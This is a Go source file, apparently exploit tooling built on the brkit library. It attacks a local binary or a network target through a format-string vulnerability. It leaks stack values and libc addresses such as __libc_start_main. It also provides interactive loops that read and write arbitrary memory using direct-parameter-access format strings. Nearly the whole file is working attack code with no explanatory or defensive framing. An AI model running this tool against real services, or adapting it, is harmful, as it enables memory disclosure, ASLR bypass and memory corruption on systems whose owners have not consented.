package main

import (
	"bufio"
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"gitlab.com/stephen-fox/brkit/memory"
	"gitlab.com/stephen-fox/brkit/process"
)

var (
	verbose    *log.Logger
	muyVerbose *log.Logger
)

func main() {
	isVerbose := flag.Bool("v", false, "Verbose output")
	isMuyVerbose := flag.Bool("vv", false, "Muy verbose output")

	flag.Parse()

	if *isVerbose {
		verbose = log.New(log.Writer(), log.Prefix(), log.Flags())
	}

	if *isMuyVerbose {
		verbose = log.New(log.Writer(), log.Prefix(), log.Flags())
		muyVerbose = log.New(log.Writer(), log.Prefix(), log.Flags())
	}

	var proc *process.Process
	if strings.Contains(flag.Arg(0), ":") {
		proc = process.DialOrExit("tcp", flag.Arg(0), process.X86_64Info())
	} else {
		cmd := exec.Command(flag.Arg(0))
		proc = process.ExecOrExit(cmd, process.X86_64Info())
		log.Printf("pid: %d", cmd.Process.Pid)
	}
	proc.SetLogger(muyVerbose)
	defer proc.Cleanup()

	writeMemoryLoop(proc)
}

func leakParams(proc *process.Process) {
	leaker := memory.NewDPAFormatStringLeakerOrExit(memory.DPAFormatStringConfig{
		ProcessIO:    proc,
		MaxNumParams: 200,
		Verbose:      verbose,
	})

	if verbose != nil {
		verbose.Printf("format string example: '%s'", leaker.PointerFormatString(1))
	}

	log.Printf("press enter when ready")
	fmt.Scanln()

	pm := memory.PointerMakerForX86_64()

	// _IO_2_1_stderr_      - 0x7f7997d8e5c0 - 21
	// _IO_file_jumps       - 0x7f7997d8f4a0 - 28
	//__libc_start_main+234 - 0x7fa0bed99d0a - 45
	_IO_2_1_stderr_ := leaker.RawPointerAtParamOrExit(21)
	_IO_file_jumps := leaker.RawPointerAtParamOrExit(28)
	__libc_start_main234 := pm.FromHexBytesOrExit(leaker.RawPointerAtParamOrExit(45), binary.BigEndian)

	log.Printf("_IO_2_1_stderr_: %s | _IO_file_jumps %s | __libc_start_main 0x%x",
		_IO_2_1_stderr_, _IO_file_jumps, __libc_start_main234.Uint()-234)

	log.Printf("press enter when done")
	fmt.Scanln()
}

func leakLocalLibcSymbolParamNumbers(proc *process.Process) {
	leaker := memory.NewDPAFormatStringLeakerOrExit(memory.DPAFormatStringConfig{
		ProcessIO:    proc,
		MaxNumParams: 200,
		Verbose:      verbose,
	})

	if verbose != nil {
		verbose.Printf("format string exmple: '%s'", leaker.PointerFormatString(1))
	}

	for {
		log.Printf("please enter a target to find followed by 'enter':\n")
		pointerStr, err := bufio.NewReader(os.Stdin).ReadString('\n')
		if err != nil {
			log.Fatalln(err)
		}
		pointerStr = pointerStr[0:len(pointerStr)-1]

		res, found := leaker.FindParamNumberOrExit([]byte(pointerStr))
		if found {
			log.Printf("format string param number for %s is %d", pointerStr, res)
		} else {
			log.Printf("failed to find '%s'", pointerStr)
		}
	}
}

func leakMemoryAtLoop(proc *process.Process) {
	leaker := memory.SetupFormatStringLeakViaDPAOrExit(memory.DPAFormatStringConfig{
		ProcessIO:    proc,
		MaxNumParams: 200,
		Verbose:      verbose,
	})

	pm := memory.PointerMakerForX86_64()

	if verbose != nil {
		verbose.Printf("format string example: '%s'",
			leaker.FormatString(pm.FromUint(0x4141414141414141)))
	}

	for {
		log.Printf("please enter a memory address to read from followed by 'enter':\n")
		pointerStr, err := bufio.NewReader(os.Stdin).ReadString('\n')
		if err != nil {
			log.Fatalln(err)
		}

		pointer, convErr := pm.FromHexString(pointerStr, binary.BigEndian)
		if convErr != nil {
			log.Printf("failed to convert pointer string - %s", err)
			continue
		}

		log.Printf("parsed pointer as '%s' (0x%x)", pointer.HexString(), pointer)

		raw := leaker.MemoryAtOrExit(pointer)

		log.Printf("read: 0x%x", raw)
	}
}

func writeMemoryLoop(proc *process.Process) {
	writer := memory.NewDPAFormatStringWriterOrExit(memory.DPAFormatStringWriterConfig{
		MaxWrite:  999,
		DPAConfig: memory.DPAFormatStringConfig{
			ProcessIO:    proc,
			MaxNumParams: 200,
			Verbose:      verbose,
		},
	})

	pm := memory.PointerMakerForX86_64()

	if verbose != nil {
		str, err := writer.LowerFourBytesFormatString(10, pm.FromUint(0x4141414141414141))
		if err != nil {
			log.Fatalf("failed to get format string for verbose log - %s", err)
		}
		verbose.Printf("format string is 0x%x", str)
	}

	for {
		log.Printf("please enter a memory address to write to and a number followed by 'enter':")
		str, err := bufio.NewReader(os.Stdin).ReadString('\n')
		if err != nil {
			log.Fatalln(err)
		}

		parts := strings.Split(strings.TrimSpace(str), " ")
		if len(parts) < 2 {
			log.Printf("please enter two values")
			continue
		}

		pointer, convErr := pm.FromHexString(parts[0], binary.BigEndian)
		if convErr != nil {
			log.Printf("failed to convert pointer string - %s", convErr)
			continue
		}

		log.Printf("parsed pointer as '%s' (0x%x)", pointer.HexString(), pointer.Bytes())

		num, convErr := strconv.Atoi(parts[1])
		if convErr != nil {
			log.Printf("failed to convert number string - %s", convErr)
			continue
		}

		writer.WriteLowerFourBytesAtOrExit(num, pointer)

		log.Printf("wrote %d to %s", num, pointer.HexString())
	}
}
